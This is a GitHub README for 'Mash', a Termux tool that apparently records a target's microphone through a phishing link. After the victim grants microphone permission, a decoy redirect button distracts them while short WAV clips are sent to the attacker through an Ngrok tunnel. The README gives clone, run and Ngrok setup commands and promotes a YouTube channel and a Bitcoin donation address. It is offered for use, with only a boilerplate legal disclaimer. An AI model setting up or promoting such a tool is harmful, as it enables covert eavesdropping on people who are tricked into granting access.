![hello](https://github.com/c-t-l/mash/blob/master/js/mash_logo.jpg)


# Mash v1.1

## YouTube : cometolearn

Subscribe Our Channel for Amazing Content ❤️


## Team : C-T-L

Capturing audio (.wav) from target using a link

![hello](https://github.com/c-t-l/mash/blob/master/js/mash.jpg)

### How it works?

After the user grants microphone permissions, a website redirect button of your choice is released to distract the target while small audio files (about 4 seconds in wav format) are sent to the attacker.

It uses Recorderjs, plugin for recording/exporting the output of Web Audio API nodes (https://github.com/mattdiamond/Recorderjs)

### Features:

Port Forwarding using Ngrok

## Legal disclaimer:

Usage of Mash for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program 

## Ngrok Manual Installation :

Video Guide https://www.youtube.com/watch?v=TZu63o3cobU

```
cd /sdcard
mv ngrok $HOME
cd
chmod +x ngrok
paste auth token ./ngrokxxxxxxxxxxx(Your Auth Token Not This Line)
cp ngrok mash

```



### Usage Commands :

```

pkg Install git -y

pkg install php -y

git clone https://github.com/c-t-l/mash

cd mash

bash mash.sh

chmod +x *

copy your Ngrok Auth Token and paste here

e.g ./ngrokxxxxxxxxxxxxx

```

### Donate!

Support the authors: https://www.youtube.com/channel/UCtwT7_eBpry-8gqhdlH7UuQ?sub_confirmation=1

### Bitcoin:

19VMLVLtzkmc9qS4mnNob35bTF6ujx1J8U
